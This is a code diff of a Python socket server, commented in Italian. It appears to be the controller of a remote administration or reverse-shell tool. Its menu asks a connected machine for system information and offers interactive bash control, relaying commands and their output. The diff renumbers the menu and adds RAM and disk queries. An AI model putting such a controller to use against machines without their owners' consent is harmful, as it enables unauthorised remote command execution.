@@ -1,5 +1,5 @@
 from socket import *
-serverPort = 12000
+serverPort = 12003
  #Dimensione del buffer, in questo caso il messaggio ricevuto puo essere al piu 4kb ma possiamo ovviamente aumentare nel caso
 BUFFER_SIZE = 1024 * 4
 serverSocket = socket(AF_INET,SOCK_STREAM)
@@ -44,7 +44,9 @@ def menu():
           +"1: ricevi informazioni sul sistema operativo\n"
           +"2: ricevi informazioni sul processore\n"
           +"3: ricevi informazioni sul tempo d'avvio\n"
-          +"4: entra in controllo della bash\n")
+          +"4: ricevi informazioni sulla memoria RAM\n"
+          +"5: ricevi informazioni sul disco\n"
+          +"6: entra in controllo della bash\n")
     return input()
     
 while True:
@@ -54,12 +56,13 @@ while True:
     
     while True:
         comando = menu()
-        if comando == '4':
+
+        if comando == '6':
             cmd = ''
             while cmd.lower() != "exit": #Finche non scegliamo di uscire dalla bash
                 cmd = input(f"{cwd}$>") #stampiamo la cwd, prendiamo il comando da eseguire e lo mandiamo
                 if cmd.lower() != "exit":
-                    invia_messaggio(f"4<sep>{cmd}")
+                    invia_messaggio(f"6<sep>{cmd}")
                     output = ricevi_messaggio()
                     queryRes, cwd = output.split('<sep>')
                     print(queryRes + "\n")
